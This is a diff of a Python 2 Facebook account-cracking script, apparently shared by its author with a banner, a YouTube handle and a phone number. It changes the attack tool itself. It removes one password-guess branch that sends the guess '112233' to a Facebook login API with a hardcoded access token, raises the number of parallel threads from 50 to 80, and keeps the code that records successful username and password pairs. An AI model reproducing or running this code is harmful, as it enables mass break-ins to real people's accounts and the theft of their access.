@@ -2,7 +2,7 @@
 #coding=utf-8
 #Codded By JAM SHAHRUKH
 #Editing My Script Will Not Make You A Coder
-#YOUTUBE : JAM SHAHRUKH
+#YOUTUBE : JAM SHAHRUKH TECHNICAL
 #Whatsapp : +971528752764
 #Pakistan Cyber Expert
 #Alone Coder Jam
@@ -60,7 +60,7 @@ logo ="""
 ---------------------------------------------------
  
 \033[1;92m➣  Coded By : JAM SHAHRUKH
-\033[1;92m➣  YouTube  : JAM SHAHRUKH
+\033[1;92m➣  YouTube  : JAM SHAHRUKH TECHNICAL
 \033[1;92m➣  Note     : Dont ReEdit It 
 \033[1;92m➣  Github   : https://github.com/JAM-x-MISHI
 \033[1;92m➣  Whatsapp : +971528752764
@@ -386,28 +386,17 @@ def pilih_super():
 															if 'access_token' in q:
 																print '\x1b[1;32mSuccessful\x1b[1;32m \x1b[1;32m▬\x1b[1;32m ' + user + ' \x1b[1;32m▬\x1b[1;32m ' + pass13
 																oks.append(user+pass13)
-															else:
-																a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
-                                                                                                                                b = json.loads(a.text)
-                                                                                                                                pass14 = '112233'
-                                                                                                                                data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass14)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-                                                                                                                                q = json.load(data)
-                                                                                                                                if 'access_token' in q:
-                                                                                                                                        print '\x1b[1;32mSuccessful\x1b[1;32m \x1b[1;32m▬\x1b[1;32m ' + user + ' \x1b[1;32m▬\x1b[1;32m ' + pass14
-                                                                                                                                        oks.append(user+pass14)
-																	
-																	
 															
 		except:
 			pass
 		
-	p = ThreadPool(50)
+	p = ThreadPool(80)
 	p.map(main, id)
 	print "\033[1;97m---------------------------------------------------"
 	
 	print '\033[1;97mProcess Has Been Completed.'
 	print"\033[1;97m-----------------"
-	print"\033[1;97mTotal OK/\x1b[1;97mCP \033[1;97m: \033[1;97m"+str(len(oks))
+	print"\033[1;97mTotal OK/\033[1;97m: \033[1;97m"+str(len(oks))
 	print "\033[1;97m---------------------------------------------------"
 	
 	
